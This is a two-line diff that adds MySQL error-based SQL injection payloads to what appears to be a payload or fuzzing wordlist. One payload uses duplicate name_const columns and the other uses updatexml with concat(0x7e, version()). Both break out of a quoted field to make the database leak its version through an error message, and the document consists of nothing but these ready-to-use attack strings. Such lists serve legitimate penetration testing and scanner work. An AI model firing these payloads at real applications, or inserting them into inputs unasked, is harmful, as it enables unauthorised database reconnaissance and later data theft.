@@ -1,0 +1,2 @@
+' *(select*from(select(name_const(version(),1)),name_const(version(),1))a)* '
+' or updatexml(1,concat(0x7e,(version())),0) or '
